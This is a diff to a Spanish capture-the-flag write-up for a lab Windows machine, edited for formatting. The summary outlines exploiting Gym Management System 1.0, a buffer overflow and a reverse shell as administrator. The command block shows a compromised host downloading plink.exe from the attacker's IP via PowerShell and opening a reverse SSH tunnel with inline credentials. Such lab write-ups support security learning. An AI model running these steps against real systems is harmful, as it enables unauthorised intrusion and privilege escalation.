@@ -12,7 +12,11 @@ Máquina Windows nivel fácil. Buff buff uff, explotaremos un gimnasio :o (casi)
 
 ### TL;DR (Spanish writeup)
 
-Buenas buenas, e.e. Mediante la enumeración de servicios nos encontramos con el puerto `8080` abierto, dándole vueltas nos topamos con el software con que fue creada la página, `Gym Management System 1.0`, usando **searchsploit** y la web le encontramos un exploit, nos aprovecharemos de el para obtener acceso a la máquina. Estando dentro veremos que el usuario `shaun` en sus carpetas tiene un binario interesante, el cual nos permite hacer cositas con las nubes :P, enumerando su origen veremos que existe un `Buffer Overflow` que afecta la versión que tenemos y nos permite ejecutar código como usuario **administrador**. Con esto en mente nos pondremos a jugar para hacer un `Remote Port Forwarding` ya que la maquina nos presentara limitantes. Después del *RPF* usaremos nuestras propias herramientas para que el **BOF** nos genere una reverse Shell como el usuario administrador del sistema. Eeeeeeeeeeeeeesto en pocas palabras. Démosle candela (:
+Buenas buenas, e.e. Mediante la enumeración de servicios nos encontramos con el puerto `8080` abierto, dándole vueltas nos topamos con el software con que fue creada la página, `Gym Management System 1.0`, usando **searchsploit** y la web le encontramos un exploit, nos aprovecharemos de el para obtener acceso a la máquina. 
+
+Estando dentro veremos que el usuario `shaun` en sus carpetas tiene un binario interesante, el cual nos permite hacer cositas con las nubes :P, enumerando su origen veremos que existe un `Buffer Overflow` que afecta la versión que tenemos y nos permite ejecutar código como usuario **administrador**. Con esto en mente nos pondremos a jugar para hacer un `Remote Port Forwarding` ya que la maquina nos presentara limitantes. 
+
+Después del *RPF* usaremos nuestras propias herramientas para que el **BOF** nos genere una reverse Shell como el usuario administrador del sistema. Eeeeeeeeeeeeeesto en pocas palabras. Démosle candela (:
 
 > Escribo para tener mis "notas", por si algun dia se me olvida todo, leer esto y reencontrarme :)
 
@@ -177,14 +181,9 @@ $service ssh restart
 Listo ahora si procedemos a subir el binario y ejecutarlo.
 
 ```powershell
-c:\Users\shaun\Downloads>cd c:\xampp\tmp
-cd c:\xampp\tmp
-
-c:\xampp\tmp>powershell IWR -uri http://10.10.15.86:8000/plink.exe -OutFile c:\xampp\tmp\plink.exe
-powershell IWR -uri http://10.10.15.86:8000/plink.exe -OutFile c:\xampp\tmp\plink.exe
-
-c:\xampp\tmp>plink.exe -l root -pw hola2 -R 8888:127.0.0.1:8888 10.10.15.86
-plink.exe -l root -pw hola2 -R 8888:127.0.0.1:8888 10.10.15.86
+c:\Users\shaun\Downloads>cd c:\Xampp\tmp
+c:\Xampp\tmp>powershell IWR -uri http://10.10.15.86:8000/plink.exe -OutFile c:\Xampp\tmp\plink.exe
+c:\Xampp\tmp>plink.exe -l root -pw hola2 -R 8888:127.0.0.1:8888 10.10.15.86
 FATAL ERROR: Network error: Connection timed out
 ```
 
